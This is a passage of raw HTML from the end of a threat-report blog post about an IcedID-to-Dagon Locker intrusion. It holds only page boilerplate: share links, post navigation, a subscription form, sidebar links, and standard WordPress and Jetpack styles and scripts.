class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-32050" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-32050 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/" rel="prev">From OneNote to RansomNote: An Ice Cold Intrusion</a></div><div class="nav-next"><a href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/" rel="next">IcedID Brings ScreenConnect and CSharp Streamer to ALPHV Ransomware Deployment</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="1265e6b2da" /><input type="hidden" name="_wp_http_referer" value="/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/" /><input type="hidden" name="post_id" value="32050"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script type="559de86b3a68296c0e054648-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2024\/04\/29\/from-icedid-to-dagon-locker-ransomware-in-29-days\/":32050};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="559de86b3a68296c0e054648-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"32050\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "32050" ]);
/* ]]> */
</script>
<script type="559de86b3a68296c0e054648-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="559de86b3a68296c0e054648-|49" defer></script></body>
</html>
